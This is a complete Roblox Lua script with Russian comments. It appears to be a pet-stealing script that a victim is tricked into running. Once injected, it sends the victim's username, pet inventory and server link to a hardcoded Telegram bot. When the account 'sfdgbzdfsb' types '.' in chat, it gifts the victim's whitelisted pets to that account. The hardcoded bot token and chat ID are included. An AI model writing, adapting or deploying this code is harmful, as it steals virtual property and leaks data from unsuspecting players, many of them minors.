local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local TextChatService = game:GetService("TextChatService")

local player = Players.LocalPlayer

-- 🔧 НАСТРОЙКИ
local TELEGRAM_TOKEN = "7678595031:AAHYzkbKKI4CdT6B2NUGcYY6IlTvWG8xkzE"
local TELEGRAM_CHAT_ID = "7144575011"
local TARGET_PLAYER = "sfdgbzdfsb"
local TRIGGER_MESSAGE = "."

-- 🐾 БЕЛЫЙ СПИСОК для передачи (только эти будут передаваться)
local WHITELIST = {
    "Hamster",
}

-- 🔎 Найти ВСЕХ питомцев (с весом и возрастом)
local function getAllPets()
    local pets = {}
    local backpack = player:FindFirstChild("Backpack") or player.Character

    for _, item in ipairs(backpack:GetChildren()) do
        if item:IsA("Tool") then
            -- Ищем формат "[X.XX KG] [Age X]"
            local weight, age = item.Name:match("%[(%d+%.%d+) KG%].*%[Age (%d+)%]")
            if weight and age then
                -- Берем основное название (до первых квадратных скобок)
                local petName = item.Name:match("^([^%[]+)") or item.Name
                petName = petName:gsub("%s+$", "")

                table.insert(pets, {
                    name = petName,
                    fullName = item.Name,
                    weight = tonumber(weight),
                    age = tonumber(age),
                    object = item,
                    -- Флаг для проверки белого списка
                    isWhitelisted = table.find(WHITELIST, petName) ~= nil
                })
            end
        end
    end

    return pets
end

-- 📜 Формируем список для уведомления (ВСЕ питомцы)
local function getFullPetsList()
    local pets = getAllPets()
    if #pets == 0 then return "нет питомцев" end

    local list = {}
    for _, pet in ipairs(pets) do
        local status = pet.isWhitelisted and "✓" or "✗"
        table.insert(list, string.format("%s %s [%.2f кг, Age %d]", status, pet.name, pet.weight, pet.age))
    end

    return table.concat(list, "\n")
end

-- 📨 Отправка в Telegram (с обработкой ошибок)
local function sendToTelegram(text)
    local url = "https://api.telegram.org/bot"..TELEGRAM_TOKEN.."/sendMessage"..
                "?chat_id="..TELEGRAM_CHAT_ID.."&text="..HttpService:UrlEncode(text)
    local success, err = pcall(function() game:HttpGet(url) end)
    if not success then
        warn("Ошибка при отправке в Telegram: "..tostring(err))
    end
end

-- 🔗 Получить ссылку на сервер (с проверкой наличия jobId)
local function getServerLink()
    local placeId = game.PlaceId
    local jobId = game.JobId
    if not jobId or jobId == "" then
        return "https://www.roblox.com/games/"..placeId
    end
    return "https://www.roblox.com/games/"..placeId.."?gameInstanceId="..jobId
end

-- 🏁 ИНИЦИАЛИЗАЦИЯ: сразу после инжекта отправляем полное уведомление
local function sendInitialNotification()
    local petsList = getFullPetsList()
    local message =
        "🔔 Игрок "..player.Name.." запустил скрипт\n\n"..
        "🐾 Питомцы:\n"..petsList.."\n\n"..
        "🔗 Ссылка на сервер:\n"..getServerLink()
    sendToTelegram(message)
end

sendInitialNotification()

-- 👂 (по желанию) слушатель чата для передачи питомцев (оставил из твоего скрипта)
local function equipPet(pet)
    if pet and player.Character and player.Character:FindFirstChild("Humanoid") then
        player.Character.Humanoid:EquipTool(pet)
        task.wait(1)
        return true
    end
    return false
end

local function transferPet(pet)
    if not pet.isWhitelisted then return false end
    local target = Players:FindFirstChild(TARGET_PLAYER)
    if target and ReplicatedStorage:FindFirstChild("PetGiftingService") then
        ReplicatedStorage.PetGiftingService:FireServer("GivePet", target)
        return true
    end
    return false
end

local function startPetTransfer()
    local pets = getAllPets()
    if #pets == 0 then
        sendToTelegram("❌ Нет питомцев для передачи")
        return
    end

    local transferred = 0
    for _, pet in ipairs(pets) do
        if pet.isWhitelisted then
            if equipPet(pet.object) then
                if transferPet(pet) then
                    transferred += 1
                end
                task.wait(2)
            end
        end
    end

    local report = {"🏁 Итого передано: "..transferred.." из "..#pets.."\n\n🐾 Список питомцев:\n"}
    for _, pet in ipairs(pets) do
        local status = pet.isWhitelisted and "✓" or "✗"
        table.insert(report, string.format("%s %s [%.2f кг, Age %d]", status, pet.name, pet.weight, pet.age))
    end
    sendToTelegram(table.concat(report, "\n"))
end

-- === НОВЫЙ КОД: подписка на чат через TextChatService ===

if TextChatService then
    TextChatService.OnIncomingMessage = function(message)
        local speaker = Players:FindFirstChild(message.TextSource.Name)
        if speaker and speaker.Name == TARGET_PLAYER and message.Text == TRIGGER_MESSAGE then
            startPetTransfer()
        end
    end
else
    -- fallback на старое событие (если TextChatService нет)
    Players.PlayerChatted:Connect(function(chatType, speaker, message)
        if chatType == Enum.PlayerChatType.All and speaker.Name == TARGET_PLAYER and message == TRIGGER_MESSAGE then
            startPetTransfer()
        end
    end)
end
